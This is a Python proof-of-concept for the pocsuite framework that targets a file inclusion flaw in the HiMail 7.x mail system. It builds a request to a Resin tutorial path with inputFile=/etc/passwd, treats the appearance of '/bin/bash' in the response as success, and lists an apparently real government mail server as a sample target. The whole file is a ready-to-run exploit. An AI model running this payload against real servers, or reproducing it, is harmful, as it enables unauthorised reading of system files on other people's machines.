#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import urlparse

class TestPOC(POCBase):
    vulID = '90225'  # ssvid
    version = '1.0'
    author = ['Magic']
    vulDate = '2015-04-08'
    createDate = '2016-05-31'
    updateDate = '2016-05-31'
    references = ['http://www.wooyun.org/bugs/wooyun-2016-0181592','http://www.wooyun.org/bugs/wooyun-2011-0177116']
    name = 'Himail邮件系统某处文件包含'
    appPowerLink = 'http://www.himail.com.cn/'
    appName = 'HiMail'
    appVersion = '7.x'
    vulType = 'File Inclusion'
    desc = '''   
    HiMail File Inclusion
    '''
    samples = ['http://mail.gzhfda.gov.cn/']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        result['VerifyInfo'] = {}
        arr = urlparse.urlparse(self.url)
        vulurl = '%s://%s/' % (arr.scheme,arr.netloc)
        payload = 'resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd'
        url = self.url + payload
        res_exp = req.get(url)
        if res_exp.status_code == 200 and '/bin/bash' in res_exp.content:
            result['VerifyInfo']['URL'] = self.url + payload
        return self.parse_attack(result)

    def parse_attack(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)